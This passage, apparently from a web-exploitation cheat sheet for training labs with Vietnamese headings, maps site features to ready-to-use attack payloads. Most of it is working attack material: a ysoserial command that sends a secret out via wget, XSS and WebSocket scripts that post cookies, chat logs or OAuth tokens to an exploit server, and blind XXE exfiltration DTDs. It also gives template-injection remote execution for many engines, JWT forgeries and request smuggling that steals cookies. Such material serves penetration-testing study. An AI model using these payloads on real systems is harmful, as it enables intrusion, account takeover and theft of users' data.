java -jar ysoserial.jar CommonsCollections6 'wget http://COLLABORATOR --post-data=$(cat /home/carlos/secret)' | base64

# Replace session cookie with payload
```

**Ruby serialized:**
```ruby
# Look for Marshal.load
# Universal deserialization gadget for Ruby 2.x
# Check PayloadsAllTheThings for chain
```

### Blind SQLi via TrackingId
```sql
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### Stay-Logged-In Cookie
```
# Decode base64: Y2FybG9zOjIwMmNi...
# = carlos:202cb962ac59075b964b07152d234b70 (md5 of password)

# Offline brute-force:
# For each password candidate: base64(carlos:md5(password))
# Match against cookie value

# XSS steal:
<script>fetch('https://EXPLOIT/'+document.cookie)</script>
# Then crack md5 offline -> login
```

### JWT Detection
```
# Cookie starts with eyJ -> JWT
# eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ.signature
# Decode header: {"alg":"HS256"}
# Decode payload: {"sub":"wiener"}
# See JWT section for attacks
```

**Dấu hiệu nhận biết:**
- `O:4:` -> PHP serialization
- `rO0` / `ac ed` -> Java serialization
- `eyJ` -> JWT
- base64 decode shows `username:hash` -> stay-logged-in brute
- Cookie reflects in page -> XSS via cookie
- Long opaque cookie -> check encoding/format

---

## 12. Live Chat / WebSocket

### Cross-Site WebSocket Hijacking (CSWSH)

**Steal chat history:**
```html
<script>
var ws = new WebSocket('wss://TARGET/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://EXPLOIT-SERVER/log?message=' + btoa(event.data), {mode: 'no-cors'});
};
</script>
```

### XSS via Chat

**Message injection:**
```html
<img src=1 onerror=alert(1)>
<img src=1 OnErRor=alert`1`>
<img src=1 onerror='alert(1)'>
```

**Obfuscated (WAF bypass):**
```html
<img src=1 OnErRor=alert\x601\x60>
<iMg sRc=1 oNeRrOr=alert(1)>
```

### IP Block Bypass on WebSocket

```http
GET /chat HTTP/1.1
Upgrade: websocket
Connection: Upgrade
X-Forwarded-For: 1.1.1.1
```

**Dấu hiệu nhận biết:**
- Live chat button -> WebSocket tab in Burp
- No Origin check on handshake -> CSWSH
- Chat renders HTML -> XSS
- IP blocked -> X-Forwarded-For on handshake

---

## 13. API Endpoint

### Discovery

```
/api                    /api/v1
/api/swagger           /swagger.json
/api/docs              /openapi.json
/api-docs              /graphql
/.well-known/          /api/graphql
/swagger/v1/swagger.json
```

### Method Tampering

```http
OPTIONS /api/products/1/price HTTP/1.1
# Response: Allow: GET, PATCH

PATCH /api/products/1/price HTTP/1.1
Content-Type: application/json

{"price":0}
```

### Mass Assignment

```http
# Step 1: GET reveals hidden fields
GET /api/checkout
# Response: {"price":1337,"chosen_discount":0}

# Step 2: Add hidden field
POST /api/checkout
{"chosen_discount":100}
# or: {"price":0}
```

### Server-Side Parameter Pollution

**Truncate with # (%23):**
```
POST /forgot-password
username=administrator%23
# Server query: GET /api/users/administrator# (rest ignored)
# Might bypass additional validation
```

**Inject with & (%26):**
```
POST /forgot-password
username=administrator%26field=reset_token
# Server query: GET /api/users/administrator&field=reset_token
# Response includes reset token
```

**Path traversal in REST URL:**
```
POST /edit_profile
name=peter%2f..%2fadmin
# Server processes: /api/private/users/peter/../admin
# Returns admin profile
```

### GraphQL

**Endpoint discovery:**
```
/graphql    /api    /api/graphql    /graphql/api
+ /v1 variants
POST + GET both
Content-Type: application/json
```

**Universal query:**
```json
{"query":"{__typename}"}
```

**Full introspection:**
```json
{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name description fields(includeDeprecated: true) { name description args { name type { name kind ofType { name kind }}} type { name kind ofType { name kind }}}}}}"}
```

**Introspection blocked? Try:**
```json
{"query":"query { __schema\n{ queryType { name }}}"}
```

**Alias brute-force (bypass rate limit):**
```graphql
query {
    attempt0:login(input:{username:"admin",password:"123456"}) { token success }
    attempt1:login(input:{username:"admin",password:"password"}) { token success }
    attempt2:login(input:{username:"admin",password:"12345678"}) { token success }
}
```

**Dấu hiệu nhận biết:**
- `/api` path exists -> find docs
- JSON request/response -> mass assignment
- `__typename` returns type -> GraphQL
- Rate limited -> GraphQL aliases
- REST API -> parameter pollution / path traversal

---

## 14. Admin Panel

### Discovery

```
/admin               /administrator
/admin-panel         /admin/delete
/administrator-panel /management
/admin-panel-jf34r   # check robots.txt
/admin-abc123        # check JS source files
```

### Access Control Bypass

**X-Original-URL / X-Rewrite-URL:**
```http
GET / HTTP/1.1
X-Original-URL: /admin

GET /?username=carlos HTTP/1.1
X-Original-URL: /admin/delete
```

**Method interchange:**
```http
# POST /admin/delete -> 403 Forbidden
# Try:
GET /admin/delete?username=carlos HTTP/1.1
POSTX /admin/delete   # invalid method -> might bypass
```

**Host header:**
```http
GET /admin HTTP/1.1
Host: localhost

# or internal IP:
Host: 192.168.0.1
```

**Referer-based:**
```http
GET /admin/delete?username=carlos HTTP/1.1
Referer: https://TARGET/admin
```

**Multi-step bypass:**
```http
# Admin delete user = 3 steps:
# Step 1: GET /admin -> list users
# Step 2: POST /admin/delete -> confirm
# Step 3: POST /admin/delete -> execute with token

# Skip to step 3 directly:
POST /admin/delete HTTP/1.1
username=carlos&confirmed=true
```

**Cookie/param based:**
```
Cookie: Admin=true; session=xxx
# or:
POST /admin/roles
username=wiener&roleid=2   # 2 = admin
```

### SSRF to Admin

```
stockApi=http://localhost/admin
stockApi=http://localhost/admin/delete?username=carlos
```

**Dấu hiệu nhận biết:**
- `/admin` returns 403 -> header bypass / SSRF
- robots.txt mentions path -> direct access
- JS source contains admin path -> direct
- Admin = localhost only -> SSRF / Host header
- Multi-step admin action -> skip to final step

---

## 15. Redirect / Return URL

### Open Redirect

```
?returnUrl=https://attacker.com
?redirect=https://attacker.com
?next=//attacker.com
?url=/\attacker.com
?path=https://attacker.com
?continue=https://attacker.com
?dest=https://attacker.com
?destination=https://attacker.com
?rurl=https://attacker.com
?redirect_uri=https://attacker.com
?return_to=https://attacker.com
?go=https://attacker.com
```

**Bypass validation:**
```
?returnUrl=https://TARGET.attacker.com
?returnUrl=https://attacker.com/TARGET
?returnUrl=https://attacker.com%23TARGET
?returnUrl=https://attacker.com\.TARGET
?returnUrl=//attacker.com
?returnUrl=/\/attacker.com
?returnUrl=/%09/attacker.com
?returnUrl=https://attacker.com%00TARGET
```

### DOM XSS via redirect param

```
?returnPath=javascript:alert(1)
?next=javascript:alert(document.domain)
# If value goes into location.href or window.open
```

### SSRF chain (open redirect + whitelist)

```
# SSRF whitelist only allows target domain
# Find open redirect on target:
stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin
# Server follows redirect to internal URL
```

### OAuth redirect_uri steal

```
redirect_uri=https://attacker.com
redirect_uri=https://TARGET/callback/../redirect?url=https://attacker.com
redirect_uri=https://TARGET/oauth?redirect=https://attacker.com
redirect_uri=https://TARGET/..%2f..%2f..%2fredirect?url=https://attacker.com
```

### Token leak via Referer

```
# Password reset: https://TARGET/reset?token=abc123
# If page loads external resource -> Referer leaks token
# Check Referer header in Burp
```

**Dấu hiệu nhận biết:**
- URL param controls redirect -> open redirect
- Open redirect on target + SSRF -> chain attack
- OAuth flow -> redirect_uri manipulation
- Reset token in URL -> Referer leak

---

## 16. XML / SOAP Input

### XXE - File Read

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///home/carlos/secret">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### XXE - SSRF

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

### XXE - Blind OOB Exfiltration

```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://EXPLOIT-SERVER/malicious.dtd">
  %xxe;
]>
<root>test</root>
```

malicious.dtd:
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLABORATOR/?data=%file;'>">
%eval;
%exfil;
```

### XXE - Error-Based Exfiltration

malicious.dtd:
```xml
<!ENTITY % file SYSTEM "file:///home/carlos/secret">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### XInclude (no DOCTYPE control)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///home/carlos/secret"/>
</foo>
```

### SVG XXE (via file upload)

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///home/carlos/secret">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### Repurpose Local DTD

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///home/carlos/secret">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<stockCheck><productId>1</productId></stockCheck>
```

Common local DTD paths:
```
/usr/share/yelp/dtd/docbookx.dtd
/usr/share/xml/fontconfig/fonts.dtd
/usr/local/tomcat/lib/jsp-api.jar!/jakarta/servlet/jsp/resources/jspxml.dtd
```

### SQLi via XML (entity-encoded bypass)

```xml
<stockCheck>
  <productId>
    1 &#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84; username&#44;password &#70;&#82;&#79;&#77; users
  </productId>
</stockCheck>
<!-- Decodes to: 1 UNION SELECT username,password FROM users -->
```

**Dấu hiệu nhận biết:**
- Content-Type: application/xml -> XXE
- XML body nhưng không control full XML -> XInclude
- WAF blocks XXE entities -> repurpose local DTD
- WAF blocks SQL keywords -> XML entity encoding
- File upload accepts SVG -> XXE via SVG

---

## 17. Template / Render User Input

### Detection Payloads

```
{{7*7}}              -> 49?     Jinja2 / Twig / Tornado
${7*7}               -> 49?     FreeMarker / Thymeleaf / Groovy
<%= 7*7 %>           -> 49?     ERB / EJS
#{7*7}               -> 49?     Slim / PugJS
${{7*7}}             -> 49?     Thymeleaf
{{7*'7'}}            -> 7777777 = Jinja2,  49 = Twig
{*comment*}          -> blank?  Smarty
```

### RCE by Engine

**ERB (Ruby):**
```ruby
<%= system("cat /home/carlos/secret") %>
<%= File.open('/home/carlos/secret').read %>
<%= `cat /home/carlos/secret` %>
<%= IO.popen('cat /home/carlos/secret').read %>
```

**Jinja2 (Python):**
```python
{{ config.__class__.__init__.__globals__['os'].popen('cat /home/carlos/secret').read() }}
{{ request.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
```

**Twig (PHP):**
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}
```

**FreeMarker (Java):**
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /home/carlos/secret")}
${"freemarker.template.utility.Execute"?new()("cat /home/carlos/secret")}
[#assign ex="freemarker.template.utility.Execute"?new()]${ex("cat /home/carlos/secret")}
```

**Handlebars (Node.js):**
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('cat /home/carlos/secret');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**Smarty (PHP):**
```
{system('cat /home/carlos/secret')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system('cat /home/carlos/secret');?>",self::clearConfig())}
```

**Django (Python) - limited (no RCE, but info leak):**
```
{{ settings.SECRET_KEY }}
{{ settings.DATABASES }}
{% debug %}
```

**Velocity (Java):**
```
#set($x='')##
#set($rt=$x.class.forName('java.lang.Runtime'))##
#set($chr=$x.class.forName('java.lang.Character'))##
#set($str=$x.class.forName('java.lang.String'))##
#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))##
$ex.waitFor()
#set($out=$ex.getInputStream())##
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
```

### Where to Find SSTI Injection Points

```
- Profile name / display name (rendered on page)
- Email template (reflected in email body)
- Blog post title / body
- 404 error page (custom error message)
- PDF/document generation (name/address fields)
- URL path reflected in page
- User-agent / Referer reflected
```

**Dấu hiệu nhận biết:**
- `{{7*7}}` = `49` in response -> SSTI confirmed
- Input renders differently than expected -> template processing
- Error message reveals engine name -> direct exploit
- Profile name shows on other pages -> stored SSTI

---

## 18. Cache Behavior

### Web Cache Poisoning

**Unkeyed header -> XSS:**
```http
GET / HTTP/1.1
Host: TARGET
X-Forwarded-Host: "></script><script>alert(1)</script>

# or inject external JS:
X-Forwarded-Host: EXPLOIT-SERVER
# Response: <script src="//EXPLOIT-SERVER/resources/js/analytics.js">
```

**Multiple headers (force redirect loop):**
```http
X-Forwarded-Host: EXPLOIT-SERVER
X-Forwarded-Scheme: http
# Server 302 redirects to https://EXPLOIT-SERVER -> cache poisoned
```

**Unkeyed cookie:**
```http
Cookie: session=xxx; lang=en"></script><script>alert(1)</script>
# Cookie value reflected + unkeyed = poisoned
```

**Unkeyed query string:**
```
GET /?evil='/><script>alert(1)</script> HTTP/1.1
# Entire query string unkeyed but reflected
```

**Unkeyed query param:**
```
GET /?utm_content='/><script>alert(1)</script> HTTP/1.1
# Specific param unkeyed
```

**Fat GET (body in GET request):**
```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/1.1
Content-Type: application/x-www-form-urlencoded

callback=alert(1)
# Body param overrides URL param, but cache keys URL only
```

**Cache key normalization:**
```
# Find param excluded from cache key via Param Miner
# Inject XSS in that param
```

**Tools:** Use Param Miner extension -> "Guess headers" / "Guess GET parameters"

### Web Cache Deception

**Static extension:**
```
/my-account/nonexistent.js
/my-account/nonexistent.css
/my-account/nonexistent.avif
```

**Delimiter-based:**
```
/my-account;wcd.js
/my-account%3fwcd.css         # encoded ?
/my-account%23wcd.js          # encoded #
/my-account%00wcd.js          # null byte
/my-account.ico
```

**Origin normalization:**
```
/resources/..%2fmy-account
/static/..%2fmy-account
/assets/..%2fmy-account
```

**Cache normalization:**
```
/my-account%2f%2e%2e%2fresources
/my-account%23%2f%2e%2e%2fresources
```

**Verification:**
```
1. Send crafted URL
2. Check response: X-Cache: miss (first request)
3. Send again: X-Cache: hit = cached!
4. Deliver URL to victim
5. After victim visits, access URL -> get their cached data
```

**Dấu hiệu nhận biết:**
- `X-Cache: hit/miss` in response -> cacheable
- `Cache-Control: public, max-age=N` -> cache active
- Static resource loads from different domain -> cache server
- Param Miner finds unkeyed input -> cache poisoning
- Sensitive page + cache -> cache deception

---

## 19. OAuth / Social Login

### Implicit Flow Exploit

```http
# After OAuth flow, token sent to target via POST:
POST /authenticate HTTP/1.1

{"email":"wiener@evil.com","username":"wiener","token":"xxx"}

# Change email/username to victim:
{"email":"carlos@target.com","username":"carlos","token":"xxx"}
```

### CSRF (no state param)

```
1. Start "Attach social media" flow
2. Intercept redirect: https://oauth-server/auth?client_id=xxx&redirect_uri=xxx
3. Note: no state parameter
4. Complete flow -> intercept final redirect with code
5. Drop request, deliver URL to victim
6. Victim's account now linked to your OAuth
7. Login with your OAuth -> access victim's account
```

### Redirect URI Manipulation

**Direct change:**
```
redirect_uri=https://EXPLOIT-SERVER
```

**Path traversal:**
```
redirect_uri=https://TARGET/oauth/..%2f..%2fredirect?url=https://EXPLOIT-SERVER
```

**Open redirect chain:**
```
redirect_uri=https://TARGET/post/next?path=https://EXPLOIT-SERVER/steal
```

**Subdomain:**
```
redirect_uri=https://anything.TARGET/callback
# Then XSS on subdomain to steal token
```

**Parameter pollution:**
```
redirect_uri=https://TARGET/callback&redirect_uri=https://EXPLOIT-SERVER
```

### Recon

```
GET /.well-known/oauth-authorization-server HTTP/1.1
GET /.well-known/openid-configuration HTTP/1.1
# Returns: authorization_endpoint, token_endpoint, jwks_uri, registration_endpoint
```

### Steal Token via postMessage

```html
<iframe src="https://oauth-server/auth?client_id=xxx&redirect_uri=https://TARGET/oauth&response_mode=web_message"></iframe>
<script>
window.addEventListener('message', function(e) {
    fetch('https://EXPLOIT/?token='+e.data.access_token);
});
</script>
```

**Dấu hiệu nhận biết:**
- "Login with" button -> OAuth flow
- No `state` param -> CSRF linking
- `redirect_uri` not strictly validated -> token theft
- Implicit flow (token in URL) -> change user
- postMessage response mode -> steal via iframe

---

## 20. JWT Token

### Detection
```
Cookie: session=eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ.xxxxx
# eyJ = base64 of {"
# Decode: header.payload.signature
```

### Attack Payloads

**Unverified signature:**
```json
// Just change payload, keep signature:
// {"sub":"wiener"} -> {"sub":"administrator"}
eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.ORIGINAL_SIGNATURE
```

**Algorithm none:**
```json
// Header: {"alg":"none"}
// Payload: {"sub":"administrator"}
// Signature: empty
eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.
// Try also: "alg":"None", "alg":"NONE", "alg":"nOnE"
```

**Brute-force weak secret:**
```bash
hashcat -a 0 -m 16500 <jwt> /path/to/jwt.secrets.list --show
# Common weak secrets: secret, password, 123456, secret1
# After cracking, re-sign with: jwt.io or python pyjwt
```

**JWK header injection:**
```json
{
  "kid": "my-key",
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "YOUR_PUBLIC_KEY_N",
    "e": "AQAB"
  }
}
// Generate RSA keypair -> embed public key in JWK -> sign with private key
// Use JWT Editor extension in Burp
```

**JKU header injection:**
```json
{
  "kid": "my-key",
  "alg": "RS256",
  "jku": "https://EXPLOIT-SERVER/.well-known/jwks.json"
}
// Host your JWKS on exploit server -> sign with matching private key
```

**KID path traversal:**
```json
{"kid":"../../../dev/null","alg":"HS256"}
// Sign with empty string (content of /dev/null = empty)
// or:
{"kid":"../../../../../../dev/null","alg":"HS256"}
```

**KID SQLi:**
```json
{"kid":"x' UNION SELECT 'my-secret'-- ","alg":"HS256"}
// Sign with "my-secret"
```

**Algorithm confusion (RS256 -> HS256):**
```
1. Get server public key: GET /jwks.json or /.well-known/jwks.json
2. Convert JWK to PEM format
3. Change header: {"alg":"HS256"} (was RS256)
4. Sign with public key PEM as HMAC secret
5. Server verifies HS256 using public key = valid!
```

**Dấu hiệu nhận biết:**
- `eyJ` cookie -> JWT
- Decode header `alg` -> choose attack
- Try unverified signature first (easiest)
- `/jwks.json` exists -> algorithm confusion
- `kid` in header -> path traversal / SQLi
- Weak secret -> hashcat brute

---

## 21. HTTP Request Headers

### Host Header Attacks

**Password reset poisoning:**
```http
POST /forgot-password HTTP/1.1
Host: EXPLOIT-SERVER
# or:
Host: TARGET
X-Forwarded-Host: EXPLOIT-SERVER
# or:
Host: TARGET
Host: EXPLOIT-SERVER
# or:
GET https://TARGET/forgot-password HTTP/1.1
Host: EXPLOIT-SERVER
```

**Admin access:**
```http
GET /admin HTTP/1.1
Host: localhost
```

**Routing-based SSRF:**
```http
GET / HTTP/1.1
Host: 192.168.0.1
# Route to internal server
```

### HTTP Request Smuggling

**CL.TE:**
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**TE.CL:**
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

**TE.TE (obfuscation):**
```http
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: xchunked
Transfer-encoding: chunked

Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-encoding: x

Transfer-Encoding:[tab]chunked
X: x[\n]Transfer-Encoding: chunked
Transfer-Encoding
: chunked
```

**H2.CL (HTTP/2 downgrade):**
```
# In HTTP/2 request, add:
Content-Length: 0

SMUGGLED
```

**H2.TE (CRLF injection in HTTP/2 header):**
```
# Header name: foo
# Header value: bar\r\nTransfer-Encoding: chunked
```

**CL.0:**
```http
# Send to endpoint not expecting body (static file):
GET /resources/images/blog.svg HTTP/1.1
Host: TARGET
Content-Length: 50
Connection: keep-alive

GET /admin HTTP/1.1
Host: TARGET

```

**Smuggle to steal cookies:**
```http
POST / HTTP/1.1
Content-Length: 200
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 800
Cookie: session=xxx

csrf=xxx&postId=1&name=a&email=a@a.com&comment=
```
Next user request appended to comment body -> steal their cookie.

**Dấu hiệu nhận biết:**
- Password reset feature -> Host header poisoning
- Reverse proxy setup -> HTTP smuggling
- HTTP/2 support -> H2 downgrade attacks
- Admin localhost only -> Host: localhost
- Timing difference CL vs TE -> detect smuggling type

---

## Summary: Feature -> Top Attacks

| Feature | Attacks (priority order) |
|---|---|
| Search box | Reflected XSS, DOM XSS, SQLi, SSTI |
| Login | SQLi bypass, Username enum, NoSQL, 2FA bypass, Brute-force |
| Category filter | SQLi UNION, Blind SQLi, NoSQL |
| Cart/Checkout | Business logic, Race condition, Mass assignment, Skip step |
| File upload | Web shell, Content-Type bypass, Path traversal, .htaccess, Null byte, Polyglot, SVG XXE |
| Comment form | Stored XSS, CSRF, Dangling markup, HTML injection |
| Email change | CSRF (all variants), SameSite bypass, Clickjacking, Truncation |
| Password reset | Host header, Logic flaw, Token leak, Middleware headers |
| Stock check | SSRF (all bypasses), XXE, XInclude, Open redirect chain |
| My Account | Web Cache Deception, IDOR, CORS, Prototype pollution, Mass assignment |
| Cookie | PHP/Java deserialization, Blind SQLi, Stay-logged-in crack, JWT |
| Live chat | CSWSH, XSS, IP bypass |
| API | Discovery, Method tampering, Mass assignment, Param pollution, GraphQL |
| Admin panel | Direct access, Header bypass, Method change, SSRF, Multi-step skip |
| Redirect URL | Open redirect, DOM XSS, SSRF chain, OAuth redirect_uri |
| XML input | XXE (direct/blind/error), XInclude, Local DTD, Entity-encoded SQLi |
| Template render | SSTI detect + exploit per engine |
| Cache | Cache Poisoning (headers/cookies/params), Cache Deception (path tricks) |
| OAuth | Implicit flow, CSRF (no state), redirect_uri bypass, Token steal |
| JWT | Unverified sig, none alg, Brute-force, JWK/JKU inject, KID traversal, Alg confusion |
| HTTP headers | Host poisoning, Smuggling (CL.TE/TE.CL/H2), Cookie steal |
